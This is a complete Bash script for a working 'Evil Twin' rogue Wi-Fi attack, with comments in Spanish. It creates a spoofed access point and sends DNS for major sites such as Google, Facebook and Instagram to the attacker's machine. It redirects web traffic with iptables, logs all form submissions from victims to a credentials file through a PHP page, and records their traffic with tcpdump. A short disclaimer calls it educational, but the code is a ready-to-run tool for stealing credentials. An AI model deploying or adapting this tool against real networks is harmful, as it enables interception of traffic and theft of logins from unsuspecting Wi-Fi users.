#!/bin/bash

#─────────────────────────────────────────────
#  EvilTwin Framework
#  Author: Aztharot
#  Signature: AZT-ETWIN-v1.0 // "El ruido también habla"
#
#  This tool was developed for educational purposes only,
#  focused on cybersecurity training, research, and awareness.
#
#  Any misuse of this software is strictly prohibited.
#  The author assumes no responsibility for improper use.
#
#  "Understand the attack to defend against it."
#─────────────────────────────────────────────
# Esto no es un juguete.
# Es una herramienta para entender cómo se rompe la confianza.
# Hecho con fines educativos, investigación y práctica ética.
# Si lo usas para otra cosa, ya no es mío.
# Aprende el ataque.
# Protege el sistema.
# No seas el problema.
#─────────────────────────────────────────────

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'

CONFIG_DIR="/opt/EVILNET"
LOG_DIR="$CONFIG_DIR/logs"
TEMP_DIR="/tmp/evilnet"
CERT_DIR="$CONFIG_DIR/certificates"
TEMPLATES_DIR="$CONFIG_DIR/templates"
CONFIG_FILE="$CONFIG_DIR/evilnet.conf"

CURRENT_INTERFACE=""
INTERNET_INTERFACE=""
CURRENT_SSID=""
CURRENT_CHANNEL=""
CURRENT_GATEWAY=""
CURRENT_SUBNET=""
CURRENT_DNS=""
CURRENT_MAC=""
CURRENT_ENTERPRISE=""
CURRENT_CERTIFICATE=""
CURRENT_PASSWORD=""
BRIDGE_MODE=false
BRIDGE_NAME="evilnet-bridge"

declare -A BACKGROUND_PIDS

trap cleanup INT TERM EXIT

function cleanup() {
    echo -e "\n${YELLOW}[*]${NC} Realizando limpieza completa..."

    if ip link show "$BRIDGE_NAME" &>/dev/null; then
        ip link set "$BRIDGE_NAME" down 2>/dev/null
        brctl delbr "$BRIDGE_NAME" 2>/dev/null
        echo -e "${GREEN}[+]${NC} Bridge $BRIDGE_NAME eliminado"
    fi

    for pid_name in "${!BACKGROUND_PIDS[@]}"; do
        if kill -0 "${BACKGROUND_PIDS[$pid_name]}" 2>/dev/null; then
            kill -9 "${BACKGROUND_PIDS[$pid_name]}" 2>/dev/null
            echo -e "${GREEN}[+]${NC} Proceso terminado: $pid_name"
        fi
    done

    iptables -F 2>/dev/null
    iptables -t nat -F 2>/dev/null
    iptables -X 2>/dev/null

    restore_interfaces

    systemctl start NetworkManager 2>/dev/null
    systemctl start wpa_supplicant 2>/dev/null

    rm -rf "$TEMP_DIR" 2>/dev/null

    echo -e "${GREEN}[+]${NC} Limpieza completada. Sistema seguro."
    exit 0
}

function print_banner() {
    clear
    echo -e "${BLUE}"
    echo "███████╗██╗   ██╗██╗██╗     ███╗   ██╗███████╗████████╗"
    echo "██╔════╝██║   ██║██║██║     ████╗  ██║██╔════╝╚══██╔══╝"
    echo "█████╗  ██║   ██║██║██║     ██╔██╗ ██║█████╗     ██║   "
    echo "██╔══╝  ╚██╗ ██╔╝██║██║     ██║╚██╗██║██╔══╝     ██║   "
    echo "███████╗ ╚████╔╝ ██║███████╗██║ ╚████║███████╗   ██║   "
    echo "╚══════╝  ╚═══╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝   ╚═╝   "
    echo -e "${NC}"
    echo -e "${PURPLE}            Framework Evil Twin v3.1${NC}"
    echo -e "${CYAN}          	  By Aztharot${NC}"
    echo -e "${CYAN}              www.instagram.com/its_aztharot/${NC}"
    echo -e "${YELLOW}=========================================================${NC}"
    echo ""
}

function check_dependencies() {
    local deps=("hostapd" "dnsmasq" "aircrack-ng" "iptables" "tcpdump" 
                "nginx" "apache2" "php" "openssl" "macchanger" "brctl")

    echo -e "${YELLOW}[*]${NC} Verificando dependencias..."

    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo -e "${RED}[!]${NC} Falta: $dep"
            return 1
        fi
    done

    echo -e "${GREEN}[+]${NC} Todas las dependencias encontradas"
    return 0
}

function setup_directories() {
    mkdir -p "$CONFIG_DIR" "$LOG_DIR" "$TEMP_DIR" "$CERT_DIR" "$TEMPLATES_DIR"
    touch "$LOG_DIR/evilnet.log" "$LOG_DIR/credentials.log" "$LOG_DIR/traffic.log"
}

function interactive_config() {
    echo -e "${CYAN}[*]${NC} Configuración de EVILNET"
    echo -e "${YELLOW}=========================================${NC}"

    select_evil_interface

    select_internet_interface

    configure_bridge_mode

    read -p "Nombre de la red (SSID): " CURRENT_SSID
    read -p "Canal (1-14): " CURRENT_CHANNEL
    read -p "Gateway (ej: 192.168.1.1): " CURRENT_GATEWAY
    read -p "Subred (ej: 192.168.1.0/24): " CURRENT_SUBNET
    read -p "DNS principal: " CURRENT_DNS

    configure_advanced

    configure_enterprise

    configure_security

    configure_redirects
}

function select_evil_interface() {
    echo -e "\n${YELLOW}[*]${NC} Selecciona la interfaz para el Evil Twin:"
    interfaces=($(ip link show | grep -E "^[0-9]+:" | awk -F: '{print $2}' | tr -d ' ' | grep -v lo))

    for i in "${!interfaces[@]}"; do
        interface_info=$(ip addr show "${interfaces[$i]}" | grep "state" | awk '{print $9}')
        echo "  $((i+1)). ${interfaces[$i]} ($interface_info)"
    done

    while true; do
        read -p "Selecciona interfaz Evil Twin (1-${#interfaces[@]}): " choice
        if [[ $choice -ge 1 && $choice -le ${#interfaces[@]} ]]; then
            CURRENT_INTERFACE="${interfaces[$((choice-1))]}"
            break
        fi
        echo -e "${RED}[!]${NC} Selección inválida"
    done
}

function select_internet_interface() {
    echo -e "\n${YELLOW}[*]${NC} Selecciona la interfaz con acceso a Internet:"
    interfaces=($(ip link show | grep -E "^[0-9]+:" | awk -F: '{print $2}' | tr -d ' ' | grep -v lo))

    for i in "${!interfaces[@]}"; do
        if [[ "${interfaces[$i]}" != "$CURRENT_INTERFACE" ]]; then
            ip_info=$(ip addr show "${interfaces[$i]}" | grep "inet " | awk '{print $2}' | head -1 || echo "Sin IP")
            gateway_info=$(ip route | grep "default" | grep "${interfaces[$i]}" | awk '{print $3}' | head -1 || echo "Sin Gateway")
            echo "  $((i+1)). ${interfaces[$i]} (IP: $ip_info, Gateway: $gateway_info)"
        fi
    done

    while true; do
        read -p "Selecciona interfaz Internet (1-${#interfaces[@]}): " choice
        if [[ $choice -ge 1 && $choice -le ${#interfaces[@]} ]]; then
            selected_interface="${interfaces[$((choice-1))]}"
            if [[ "$selected_interface" != "$CURRENT_INTERFACE" ]]; then
                INTERNET_INTERFACE="$selected_interface"
                break
            else
                echo -e "${RED}[!]${NC} No puedes seleccionar la misma interfaz"
            fi
        fi
        echo -e "${RED}[!]${NC} Selección inválida"
    done

    if ! check_internet_connection; then
        echo -e "${YELLOW}[!]${NC} La interfaz seleccionada no tiene conexión a Internet"
        read -p "¿Continuar de todas formas? (s/n): " continue_choice
        if [[ "$continue_choice" != "s" ]]; then
            select_internet_interface
        fi
    fi
}

function check_internet_connection() {
    if ip route | grep "default" | grep -q "$INTERNET_INTERFACE"; then
        return 0
    fi
    return 1
}

function configure_bridge_mode() {
    echo -e "\n${CYAN}[*]${NC} Configuración de Bridge"
    echo "1. Modo NAT"
    echo "2. Modo Bridge"

    read -p "Selecciona modo (1-2): " bridge_choice

    case $bridge_choice in
        1) 
            BRIDGE_MODE=false
            echo -e "${GREEN}[+]${NC} Usando modo NAT"
            ;;
        2) 
            BRIDGE_MODE=true
            echo -e "${GREEN}[+]${NC} Usando modo Bridge"
            configure_bridge_settings
            ;;
        *) 
            echo -e "${RED}[!]${NC} Opción inválida, usando modo NAT"
            BRIDGE_MODE=false
            ;;
    esac
}

function configure_bridge_settings() {
    read -p "Nombre del bridge (por defecto: $BRIDGE_NAME): " bridge_name_input
    if [[ -n "$bridge_name_input" ]]; then
        BRIDGE_NAME="$bridge_name_input"
    fi

    read -p "IP del bridge (ej: 192.168.1.1): " bridge_ip
    if [[ -n "$bridge_ip" ]]; then
        CURRENT_GATEWAY="$bridge_ip"
    fi

    read -p "Máscara de red (ej: 255.255.255.0): " bridge_netmask
    if [[ -n "$bridge_netmask" ]]; then
        CURRENT_SUBNET="$bridge_ip/$bridge_netmask"
    fi

    echo -e "${YELLOW}[*]${NC} El bridge conectará $CURRENT_INTERFACE con $INTERNET_INTERFACE"
}

function configure_advanced() {
    echo -e "\n${CYAN}[*]${NC} Configuración avanzada"
    CURRENT_MAC=$(printf '02:%02x:%02x:%02x:%02x:%02x' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
    echo -e "MAC address: ${GREEN}$CURRENT_MAC${NC}"
}

function configure_enterprise() {
    echo -e "\n${PURPLE}[*]${NC} Configuración de red empresarial"
    CURRENT_ENTERPRISE="BASIC"
}

function configure_security() {
    echo -e "\n${CYAN}[*]${NC} Configuración de seguridad"
    read -p "¿Proteger red con contraseña WPA2? (s/n): " pass_choice
    if [[ "$pass_choice" == "s" ]]; then
        read -s -p "Contraseña WPA2: " CURRENT_PASSWORD
        echo
        echo -e "${GREEN}[+]${NC} Contraseña configurada"
    else
        CURRENT_PASSWORD=""
    fi
}

function configure_redirects() {
    echo -e "\n${YELLOW}[*]${NC} Configuración de redirecciones"
    SELECTED_REDIRECTS=("google.com" "facebook.com" "instagram.com" "twitter.com" "whatsapp.com")
    echo -e "${GREEN}[+]${NC} 5 sitios configurados para redirección"
}

function setup_bridge() {
    if [[ "$BRIDGE_MODE" == true ]]; then
        echo -e "${YELLOW}[*]${NC} Configurando bridge $BRIDGE_NAME..."
        brctl addbr "$BRIDGE_NAME" 2>/dev/null
        brctl addif "$BRIDGE_NAME" "$CURRENT_INTERFACE" 2>/dev/null
        brctl addif "$BRIDGE_NAME" "$INTERNET_INTERFACE" 2>/dev/null

        ip addr flush dev "$CURRENT_INTERFACE"
        ip addr flush dev "$INTERNET_INTERFACE"
        ip addr add "$CURRENT_GATEWAY/24" dev "$BRIDGE_NAME"

        ip link set "$BRIDGE_NAME" up

        echo 1 > /proc/sys/net/ipv4/ip_forward

        echo -e "${GREEN}[+]${NC} Bridge $BRIDGE_NAME configurado correctamente"
    fi
}

function setup_network() {
    echo -e "${YELLOW}[*]${NC} Configurando interfaces de red..."

    systemctl stop NetworkManager 2>/dev/null
    systemctl stop wpa_supplicant 2>/dev/null

    if [[ "$BRIDGE_MODE" == true ]]; then
        setup_bridge
    else
        airmon-ng check kill > /dev/null 2>&1
        ip link set "$CURRENT_INTERFACE" down
        macchanger -m "$CURRENT_MAC" "$CURRENT_INTERFACE" > /dev/null 2>&1
        iwconfig "$CURRENT_INTERFACE" mode monitor
        ip link set "$CURRENT_INTERFACE" up

        ip addr add "$CURRENT_GATEWAY/24" dev "$CURRENT_INTERFACE"
    fi
}

function setup_ap() {
    echo -e "${YELLOW}[*]${NC} Configurando AP..."

    cat > "$TEMP_DIR/hostapd.conf" << EOF
interface=$CURRENT_INTERFACE
driver=nl80211
ssid=$CURRENT_SSID
channel=$CURRENT_CHANNEL
hw_mode=g
ieee80211n=1
wmm_enabled=1
auth_algs=1
ignore_broadcast_ssid=0
$(if [[ -n "$CURRENT_PASSWORD" ]]; then
echo "wpa=2"
echo "wpa_passphrase=$CURRENT_PASSWORD"
echo "wpa_key_mgmt=WPA-PSK"
echo "rsn_pairwise=CCMP"
fi)
macaddr_acl=0
EOF

    hostapd -B "$TEMP_DIR/hostapd.conf" >> "$LOG_DIR/evilnet.log" 2>&1
    BACKGROUND_PIDS["hostapd"]=$!

    sleep 3
    if pgrep hostapd > /dev/null; then
        echo -e "${GREEN}[+] AP iniciado: $CURRENT_SSID${NC}"
    else
        echo -e "${RED}[!] Error: hostapd no se inició correctamente${NC}"
        return 1
    fi
}

function setup_dhcp_dns() {
    echo -e "${YELLOW}[*]${NC} Configurando DHCP y DNS..."

    if [[ "$BRIDGE_MODE" == true ]]; then
        cat > "$TEMP_DIR/dnsmasq.conf" << EOF
interface=$BRIDGE_NAME
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,$CURRENT_GATEWAY
dhcp-option=6,$CURRENT_DNS
server=$CURRENT_DNS
log-queries
log-dhcp
EOF
    else
        cat > "$TEMP_DIR/dnsmasq.conf" << EOF
interface=$CURRENT_INTERFACE
dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h
dhcp-option=3,$CURRENT_GATEWAY
dhcp-option=6,$CURRENT_GATEWAY
server=$CURRENT_DNS
log-queries
log-dhcp
EOF
    fi

    for site in "${SELECTED_REDIRECTS[@]}"; do
        echo "address=/$site/$CURRENT_GATEWAY" >> "$TEMP_DIR/dnsmasq.conf"
    done

    dnsmasq -C "$TEMP_DIR/dnsmasq.conf" >> "$LOG_DIR/evilnet.log" 2>&1 &
    BACKGROUND_PIDS["dnsmasq"]=$!
}

function setup_iptables() {
    echo -e "${YELLOW}[*]${NC} Configurando reglas de firewall..."

    if [[ "$BRIDGE_MODE" == false ]]; then
        iptables -t nat -A PREROUTING -i "$CURRENT_INTERFACE" -p tcp --dport 80 -j DNAT --to-destination "$CURRENT_GATEWAY:80"
        iptables -t nat -A PREROUTING -i "$CURRENT_INTERFACE" -p tcp --dport 443 -j DNAT --to-destination "$CURRENT_GATEWAY:443"
        iptables -t nat -A POSTROUTING -o "$INTERNET_INTERFACE" -j MASQUERADE
        iptables -A FORWARD -i "$CURRENT_INTERFACE" -o "$INTERNET_INTERFACE" -j ACCEPT
        iptables -A FORWARD -i "$INTERNET_INTERFACE" -o "$CURRENT_INTERFACE" -j ACCEPT
    else
        iptables -t nat -A PREROUTING -i "$BRIDGE_NAME" -p tcp --dport 80 -j DNAT --to-destination "$CURRENT_GATEWAY:80"
        iptables -t nat -A PREROUTING -i "$BRIDGE_NAME" -p tcp --dport 443 -j DNAT --to-destination "$CURRENT_GATEWAY:443"
    fi

    iptables -A INPUT -i lo -j ACCEPT
    iptables -A OUTPUT -o lo -j ACCEPT
}

function setup_web_servers() {
    echo -e "${YELLOW}[*]${NC} Configurando servidor web..."
    mkdir -p "$TEMP_DIR/www"

    cat > "$TEMP_DIR/www/index.php" << 'EOF'
<?php
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');
$host = $_SERVER['HTTP_HOST'] ?? 'google.com';

file_put_contents('/opt/EVILNET/logs/traffic.log', 
    "[$time] CONNECT - IP: $ip - Host: $host - Agent: $user_agent\n", FILE_APPEND);

if ($_POST) {
    $post_data = json_encode($_POST);
    file_put_contents('/opt/EVILNET/logs/credentials.log', 
        "[$time] POST - IP: $ip - Data: $post_data\n", FILE_APPEND);
}

header("Location: https://$host");
exit;
?>
EOF

    php -S "$CURRENT_GATEWAY:80" -t "$TEMP_DIR/www" >/dev/null 2>&1 &
    BACKGROUND_PIDS["webserver"]=$!

    echo -e "${GREEN}[+] Servidor listo para captura${NC}"
}

function start_monitoring() {
    echo -e "${YELLOW}[*]${NC} Iniciando monitorización..."
    touch "$LOG_DIR/credentials.log"
    touch "$LOG_DIR/traffic.log"

    tcpdump -i any -A -s 0 'port 80 or port 443' >> "$LOG_DIR/traffic_raw.log" 2>&1 &
    BACKGROUND_PIDS["tcpdump"]=$!

    echo -e "${GREEN}[+] Sistemas de monitorización activos${NC}"
}

function show_network_info() {
    echo -e "\n${CYAN}====== INFORMACIÓN DE RED ======${NC}"
    echo -e "Modo: ${YELLOW}$([[ "$BRIDGE_MODE" == true ]] && echo "BRIDGE" || echo "NAT")${NC}"
    echo -e "Interfaz Evil Twin: ${GREEN}$CURRENT_INTERFACE${NC}"
    echo -e "Interfaz Internet: ${BLUE}$INTERNET_INTERFACE${NC}"
    
    if [[ "$BRIDGE_MODE" == true ]]; then
        echo -e "Bridge: ${PURPLE}$BRIDGE_NAME${NC}"
        echo -e "IP Bridge: ${GREEN}$CURRENT_GATEWAY${NC}"
    else
        echo -e "Gateway: ${GREEN}$CURRENT_GATEWAY${NC}"
    fi
    
    echo -e "\n${CYAN}====== ESTADO DE INTERFACES ======${NC}"
    ip addr show dev "$CURRENT_INTERFACE" 2>/dev/null | grep "inet" | awk '{print "  Evil Twin: "$2}'
    ip addr show dev "$INTERNET_INTERFACE" 2>/dev/null | grep "inet" | awk '{print "  Internet: "$2}'
    if [[ "$BRIDGE_MODE" == true ]]; then
        ip addr show dev "$BRIDGE_NAME" 2>/dev/null | grep "inet" | awk '{print "  Bridge: "$2}'
    fi
}

function show_dashboard() {
    while true; do
        clear
        print_banner
        
        echo -e "${CYAN}====== EVILDASHBOARD ======${NC}"
        echo -e "SSID: ${GREEN}$CURRENT_SSID${NC}"
        echo -e "Modo: ${YELLOW}$([[ "$BRIDGE_MODE" == true ]] && echo "BRIDGE" || echo "NAT")${NC}"
        echo -e "Interfaz Evil Twin: ${GREEN}$CURRENT_INTERFACE${NC}"
        echo -e "Interfaz Internet: ${BLUE}$INTERNET_INTERFACE${NC}"
        echo -e "Clientes conectados: ${PURPLE}$(get_connected_clients)${NC}"
        echo -e "Credenciales capturadas: ${RED}$(get_credential_count)${NC}"
        echo -e ""
        echo -e "${YELLOW}Opciones:${NC}"
        echo -e "  1. Mostrar información de red"
        echo -e "  2. Mostrar clientes conectados"
        echo -e "  3. Ver credenciales capturadas"
        echo -e "  4. Ver tráfico en tiempo real"
        echo -e "  5. Estadísticas de red"
        echo -e "  6. Salir y limpiar"
        echo -e ""
        
        read -t 20 -p "Selecciona opción (enter para actualizar): " choice
        
        case $choice in
            1) show_network_info; read -p "Presiona enter para continuar..." ;;
            2) show_connected_clients ;;
            3) show_captured_credentials ;;
            4) show_realtime_traffic ;;
            5) show_network_stats ;;
            6) break ;;
        esac
    done
}

function show_network_stats() {
    echo -e "\n${CYAN}====== ESTADÍSTICAS DE RED ======${NC}"
    
    if [[ "$BRIDGE_MODE" == true ]]; then
        echo -e "Tráfico Bridge:"
        brctl showstp "$BRIDGE_NAME" 2>/dev/null | grep -A5 "$BRIDGE_NAME"
    else
        echo -e "Tráfico NAT:"
        iptables -L -v -n | grep -E "Chain|ACCEPT|DROP"
    fi
    
    echo -e "\nConexiones activas:"
    netstat -tun | grep -E ":(80|443)" | wc -l
    read -p "Presiona enter para continuar..."
}

function get_connected_clients() {
    if [[ "$BRIDGE_MODE" == true ]]; then
        arp -n -i "$BRIDGE_NAME" 2>/dev/null | grep -v "incomplete" | wc -l
    else
        arp -n -i "$CURRENT_INTERFACE" 2>/dev/null | grep -v "incomplete" | wc -l
    fi
}

function get_credential_count() {
    if [[ -f "$LOG_DIR/credentials.log" ]]; then
        wc -l < "$LOG_DIR/credentials.log"
    else
        echo "0"
    fi
}

function show_connected_clients() {
    echo -e "\n${CYAN}====== CLIENTES CONECTADOS ======${NC}"
    if [[ "$BRIDGE_MODE" == true ]]; then
        arp -n -i "$BRIDGE_NAME" 2>/dev/null | head -10
    else
        arp -n -i "$CURRENT_INTERFACE" 2>/dev/null | head -10
    fi
    read -p "Presiona enter para continuar..."
}

function show_captured_credentials() {
    echo -e "\n${RED}====== CREDENCIALES CAPTURADAS ======${NC}"
    if [[ -f "$LOG_DIR/credentials.log" ]]; then
        cat "$LOG_DIR/credentials.log"
    else
        echo "No hay credenciales capturadas"
    fi
    read -p "Presiona enter para continuar..."
}

function show_realtime_traffic() {
    echo -e "\n${YELLOW}====== TRÁFICO EN TIEMPO REAL ======${NC}"
    echo "Últimas conexiones:"
    tail -10 "$LOG_DIR/traffic.log" 2>/dev/null || echo "No hay tráfico reciente"
    read -p "Presiona enter para continuar..."
}

function restore_interfaces() {
    echo -e "${YELLOW}[*]${NC} Restaurando interfaces..."
    
    if ip link show "$BRIDGE_NAME" &>/dev/null; then
        ip link set "$BRIDGE_NAME" down 2>/dev/null
        brctl delbr "$BRIDGE_NAME" 2>/dev/null
    fi
    
    ip link set "$CURRENT_INTERFACE" down 2>/dev/null
    iwconfig "$CURRENT_INTERFACE" mode master 2>/dev/null
    ip link set "$CURRENT_INTERFACE" up 2>/dev/null
    
    ip link set "$INTERNET_INTERFACE" up 2>/dev/null
    
    systemctl restart NetworkManager 2>/dev/null
}

function main() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!]${NC} Este script debe ejecutarse como root"
        exit 1
    fi
    
    print_banner
    
    if ! check_dependencies; then
        echo -e "${RED}[!]${NC} Instala las dependencias faltantes antes de continuar"
        exit 1
    fi
    
    setup_directories
    interactive_config
    
    echo -e "\n${GREEN}[+]${NC} Iniciando EVILNET..."
    
    setup_network
    setup_ap
    setup_dhcp_dns
    setup_web_servers
    setup_iptables
    start_monitoring
    
    echo -e "${GREEN}[+]${NC} EVILNET iniciado correctamente"
    echo -e "${YELLOW}[*]${NC} Red: $CURRENT_SSID"
    echo -e "${YELLOW}[*]${NC} Modo: $([[ "$BRIDGE_MODE" == true ]] && echo "BRIDGE" || echo "NAT")"
    echo -e "${YELLOW}[*]${NC} Gateway: $CURRENT_GATEWAY"
    echo -e "${YELLOW}[*]${NC} Monitorizando..."
    
    show_dashboard
}

main "$@"
